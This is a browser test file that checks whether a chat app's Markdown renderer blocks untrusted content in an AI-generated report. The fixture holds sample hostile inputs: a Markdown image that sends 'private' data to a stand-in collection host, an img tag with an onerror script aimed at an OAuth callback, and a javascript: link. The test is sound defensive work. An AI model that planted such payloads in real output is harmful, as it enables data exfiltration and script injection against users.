import { test, expect } from './fixtures';

test('不可信 Markdown 不自动加载图片或执行 HTML', async ({ page, request }) => {
  const workspace = await (await request.get('/api/workspace')).json();
  const stamp = new Date().toISOString();
  const conversation = { id: 'security-conversation', title: '安全测试', position: -1, created_at: stamp, updated_at: stamp };
  const run = { id: 'security-run', kind: 'chat', conversation_id: conversation.id, prompt: '测试', status: 'completed', mode: 'demo', created_at: stamp,
    report: '![private](https://untrusted.invalid/collect?data=private)\n\n<img src="/api/integrations/google/callback?state=bad" onerror="window.pwned=true">\n\n[link](javascript:alert(1))', tokens: 0 };
  let automaticRequests = 0;
  page.on('request', req => { if (req.url().includes('untrusted.invalid') || req.url().includes('state=bad')) automaticRequests++; });
  await page.route('**/api/workspace', route => route.fulfill({ json: { ...workspace, conversations: [conversation], chats: [run] } }));
  await page.goto('/#chat/' + conversation.id);
  await expect(page.locator('.markdown')).toBeVisible();
  await expect(page.locator('.markdown img, .markdown script, .markdown a[href^="javascript:"]')).toHaveCount(0);
  expect(automaticRequests).toBe(0);
  expect(await page.evaluate(() => (window as Window & {pwned?: boolean}).pwned)).toBeUndefined();
});
